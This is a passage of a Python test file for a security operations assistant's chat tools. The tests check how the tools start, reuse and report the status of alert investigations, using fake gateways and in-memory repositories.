    assert response.active_alert_id == "cVATn58B3vQGyj_JLTuV"


def _chat_tools(gateway, investigations):
    return {
        item.name: item
        for item in build_tools(
            gateway,
            report_repository=InMemoryReportRepository(),
            investigations=investigations,
            organization_id="user-test",
            created_by="user-test",
            conversation_id=None,
        )
    }


def test_chat_start_investigation_tool_starts_a_real_investigation(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    gateway, investigations = FakeGateway(), FakeInvestigations()
    tools = _chat_tools(gateway, investigations)

    raw = tools["start_investigation"].invoke(
        {"alert_id": "alert-1", "agent_id": "001"}
    )
    result = json.loads(raw)

    assert result["investigation_id"] == "INV-TEST"
    assert result["current_stage"] == "human_approval"
    assert "existing" not in result
    assert investigations.started[0]["alert_id"] == "alert-1"
    assert investigations.started[0]["initiated_by"] == "user-test"


def test_chat_start_investigation_tool_returns_existing_investigation(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    gateway, investigations = FakeGateway(), FakeInvestigations()
    investigations.active_for_alert = lambda alert_id, organization_id: {
        "investigation_id": "INV-EXISTING",
        "alert_id": alert_id,
        "agent_id": "001",
        "status": "running",
        "current_stage": "analyze",
    }
    tools = _chat_tools(gateway, investigations)

    raw = tools["start_investigation"].invoke({"alert_id": "alert-1"})
    result = json.loads(raw)

    assert result == {
        "investigation_id": "INV-EXISTING",
        "status": "running",
        "current_stage": "analyze",
        "existing": True,
    }
    assert investigations.started == []


def test_chat_start_investigation_tool_rejects_placeholder_alert_id(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    gateway, investigations = FakeGateway(), FakeInvestigations()
    tools = _chat_tools(gateway, investigations)

    raw = tools["start_investigation"].invoke({"alert_id": "ALERT-ID"})
    result = json.loads(raw)

    assert result["error"] == "INVALID_ALERT_ID"
    assert investigations.started == []


def test_chat_get_investigation_status_tool_reports_snapshot(monkeypatch):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    tools = _chat_tools(FakeGateway(), FakeInvestigations())

    raw = tools["get_investigation_status"].invoke(
        {"investigation_id": "INV-TEST"}
    )
    result = json.loads(raw)

    assert result["investigation_id"] == "INV-TEST"
    assert result["status"] == "completed"
    assert result["current_stage"] == "report"


def test_chat_get_investigation_status_tool_reports_missing_investigation(
    monkeypatch,
):
    monkeypatch.setattr("app.soc_assistant.service.database_url", lambda: None)
    tools = _chat_tools(FakeGateway(), FakeInvestigations())

    raw = tools["get_investigation_status"].invoke(
        {"investigation_id": "INV-MISSING"}
    )
    result = json.loads(raw)

    assert "was not found" in result["error"]
